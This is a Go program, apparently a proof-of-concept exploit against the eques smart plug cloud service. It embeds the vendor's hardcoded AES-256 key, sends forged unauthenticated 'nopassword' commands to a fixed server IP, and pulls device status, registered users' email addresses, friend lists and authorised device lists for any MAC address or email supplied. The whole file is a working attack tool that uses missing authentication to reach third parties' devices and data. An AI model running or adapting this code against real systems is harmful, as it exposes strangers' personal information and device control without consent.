package main

import "fmt"
import "net"
import "flag"
import "os"
import "crypto/aes"
import "encoding/hex"
import "encoding/base64"

//AES 256 Encryption using the key fdsl;mewrjope456fds4fbvfnjwaugfo
func aesEcb256Encrypt(parsedCommand string) (string) {
        key, _ := hex.DecodeString("6664736c3b6d6577726a6f706534353666647334666276666e6a77617567666f")

        bs := 16

	var plaintext []byte
	nopadplaintext := []byte(parsedCommand)
        pad := bs - len(nopadplaintext) % bs

	if pad != 16 {
		paddedlength := len(nopadplaintext) + pad
		paddedplaintext := make([]byte, paddedlength)
		copy(paddedplaintext, nopadplaintext)

		plaintext = paddedplaintext

	} else {
		plaintext = []byte(parsedCommand)
		}

        block, err := aes.NewCipher(key)
        if err != nil {
                panic(err)
        }

        ciphertext := make([]byte, len(plaintext))
	be := 0
        for len(plaintext) > 0 {
                block.Encrypt(ciphertext[be:], plaintext)
                plaintext = plaintext[bs:]
                be += bs
        }
	return base64.StdEncoding.EncodeToString([]byte(ciphertext))
}

//AES 256 Decryption using the key fdsl;mewrjope456fds4fbvfnjwaugfo
func aesEcb256Decrypt(commandResponse string) (string) {
        key, _ := hex.DecodeString("6664736c3b6d6577726a6f706534353666647334666276666e6a77617567666f")

        bs := 16

	var ciphertext []byte
	nopadciphertext, _ := hex.DecodeString(commandResponse)
        pad := bs - len(nopadciphertext) % bs

	if pad != 16 {
		paddedlength := len(nopadciphertext) + pad
		paddedciphertext := make([]byte, paddedlength)
		copy(paddedciphertext, nopadciphertext)

		ciphertext = paddedciphertext

	} else {
		ciphertext, _ = hex.DecodeString(commandResponse)
		}

        block, err := aes.NewCipher(key)
        if err != nil {
                panic(err)
        }

        plaintext := make([]byte, len(ciphertext))
	be := 0
        for len(ciphertext) > 0 {
			block.Decrypt(plaintext[be:], ciphertext)
            ciphertext = ciphertext[bs:]
            be += bs
        }
	return string(plaintext)
}

//TCP client to connect to ikonkek2.com server on port 9123(The IP is specified here)
func tcpClient(command []byte) {
	remoteaddress := net.TCPAddr{
    Port: 9123,
    IP: net.ParseIP("54.183.8.151"),
	}

	connection, err := net.DialTCP("tcp", nil, &remoteaddress)
	
	if err != nil {
	    panic(err)
	}

	defer connection.Close()

	connection.Write(command)

	tcpbuffer := make([]byte, 1024)
	length, err := connection.Read(tcpbuffer)
	if err != nil {
        panic(err)
	} else {
		fmt.Printf("Length: %d\n", length)
		fmt.Printf("Address: %s\n", connection.RemoteAddr().String()+"\n")
		fmt.Printf("Response: %s\n", tcpbuffer)
	}

	encryptedResponse, _ := base64.StdEncoding.DecodeString(string(tcpbuffer))
	hexResponse := hex.EncodeToString(encryptedResponse)
	decryptedResponse := aesEcb256Decrypt(hexResponse)
	fmt.Printf("%s\n", decryptedResponse)
}

func main() {

	var command string
	var commandPrefix string
	var encodedCommand []byte
	macPtr := flag.String("mac", "", "Mac address of the eques plug in the format aa-bb-cc-dd-ee-ff")
	commandPtr := flag.String("command", "", "Either of: [version; status; brmode; usb; auth; timer; timetask; totaltimer; blue](mac address of the smart power plug needed); [friends](mac address of the phone needed); [users; oppouser; oppodevice](email address of the user needed)")
	emailPtr := flag.String("email", "", "Email address of the user")

	flag.Parse()

	if *macPtr == "" {
		fmt.Println("the mac address of the smart power plug must be specified\n")
		flag.PrintDefaults()
		os.Exit(1)
	}

	if *commandPtr == "" {
		fmt.Println("the command must be specified\n")
		flag.PrintDefaults()
		os.Exit(1)
	}

	switch *commandPtr {
    case "version":
        command = "wan_phone%"+*macPtr+"%nopassword%check#version%request"
        commandPrefix = "getDeviceInfo:"
    case "totaltimer":
        command = "wan_phone%"+*macPtr+"%nopassword%check#total%timer"
        commandPrefix = "timetask:"
    case "brmode":
        command = "wan_phone%"+*macPtr+"%nopassword%check%brmode"
        commandPrefix = "getDeviceStatus:"
    case "usb":
        command = "wan_phone%"+*macPtr+"%nopassword%check%usb"
        commandPrefix = "getDeviceStatus:"
    case "status":
        command = "wan_phone%"+*macPtr+"%nopassword%check%relay"
        commandPrefix = "getDeviceStatus:"
    case "auth": //This will return the email address of the registered user
        command = "wan_phone%"+*macPtr+"%nopassword%getAuthDevList%getAuthDevList_req"
        commandPrefix = "getAuthDevList:"
    case "timer":
        command = "wan_phone%"+*macPtr+"%nopassword%check#relay%timer"
        commandPrefix = "timetask:"
    case "blue":
        command = "wan_phone%"+*macPtr+"%nopassword%check%blue"
        commandPrefix = "getDeviceStatus:"
    case "friends": //use phone mac
        command = "wan_phone%"+*macPtr+"eques%nopassword%getfriend%freq"
        commandPrefix = "getFriendsStatusNew:"
    case "users": //use email address you got from auth request
        command = "wan_phone%"+*emailPtr+"eques%getUserAuthList%getUserAuthList_req"
        commandPrefix = "getUserAuthList:"
    case "oppouser": //use email address you got from auth request
        command = "wan_phone%"+*emailPtr+"eques%getOppoUserAuthList%getOppoUserAuthList_req"
        commandPrefix = "getOppoUserAuthList:"
    case "oppodevice": //use email address you got from auth request
        command = "wan_phone%"+*emailPtr+"eques%getOppoAuthDevList%getOppoAuthDevList_req"
        commandPrefix = "getOppoAuthDevList:"

    default:
    	fmt.Println("Wrong command argument(s) specified\n")
    	flag.PrintDefaults()
    	os.Exit(1)
    }

	ciphertext := aesEcb256Encrypt(command)
	fmt.Println("Sending Command:", command+"\n")
	fmt.Println("Sending Encoded Command:", commandPrefix+ciphertext+"\n")
	encodedCommand = []byte(commandPrefix+ciphertext+"\n")
	tcpClient(encodedCommand)
}
